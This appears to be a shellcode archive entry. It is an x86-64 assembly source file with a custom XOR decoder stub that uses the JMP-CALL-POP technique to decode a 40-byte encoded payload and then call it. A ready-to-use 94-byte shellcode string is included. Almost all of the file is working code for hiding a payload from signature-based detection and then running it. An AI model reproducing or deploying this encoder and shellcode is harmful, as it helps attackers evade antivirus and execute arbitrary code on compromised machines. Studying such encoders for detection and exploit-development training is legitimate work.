; Author: Robert C. Raducioiu
; Shellcode: "\x31\xc9\xeb\x2d\x5e\x80\xc1\x28\x56\x5a\x52\xeb\x08\x48\x83\xc6\x08\x48\x83\xc2\x07\x31\xc0\x8a\x1e\x80\xf3\xd1\x04\x01\x8a\x3c\x06\x30\xdf\x88\x3c\x02\x3c\x07\x74\xe3\xe2\xf0\x58\x04\x01\xff\xd0\xe8\xce\xff\xff\xff\x4e\xae\x5f\xcf\xd7\x16\x7d\xd7\xcd\xa7\x33\x7e\x75\x72\x33\x33\x6d\xcf\xd4\xef\xf4\x35\x5b\xec\x14\x92\x8d\x4c\x23\x46\x05\xfe\x7d\xa3\xa9\x7d\x7d\x7d\x7d\x7d"
; Shellcode length: 94 bytes

global _start

section .text

_start:

    ; clear RCX
    xor ecx, ecx

    jmp short CallShellcode

Shellcode:

    ; get the address of the encoded shellcode using
    ; the JMP-CALL-POP technique
    pop rsi
    
    ; statically set the size of the shellcode
    add cl, 40

    ; save the base address of the shellcode in RDX
    push rsi
    pop rdx

    ; push to the stack for later use
    push rdx

    ; skip the next routine
    jmp short LoopDecodeSkip

LoopDecode:

    ; increase registers to step to the next chunk
    add rsi, 8
    add rdx, 7

LoopDecodeSkip:

    ; clear RAX
    xor eax, eax

    ; get the XOR byte of the chunk and XOR it
    ; with the XOR byte generated initially
    mov bl, BYTE [rsi]
    xor bl, 0xd1

CopyDecodedByte:

    ; step to the next encoded byte
    add al, 1

    ; decode the encoded byte
    mov bh, BYTE [rsi + rax]
    xor bh, bl

    ; replace the encoded byte with the decoded one
    mov BYTE [rdx + rax], bh

    ; if RAX is 7 it means we decoded 7 bytes
    ; it's time to go to the next chunk
    cmp al, 7
    jz LoopDecode

    ; if RCX != 0 then go back to decoding
    loop CopyDecodedByte

RunShellcode:

    ; skip the first byte (XOR byte)
    pop rax
    add al, 1

    ; run the decoded shellcode
    call rax

CallShellcode:

    call Shellcode
    encoded: db 0x4e,0xae,0x5f,0xcf,0xd7,0x16,0x7d,0xd7,0xcd,0xa7,0x33,0x7e,0x75,0x72,0x33,0x33,0x6d,0xcf,0xd4,0xef,0xf4,0x35,0x5b,0xec,0x14,0x92,0x8d,0x4c,0x23,0x46,0x5,0xfe,0x7d,0xa3,0xa9,0x7d,0x7d,0x7d,0x7d,0x7d
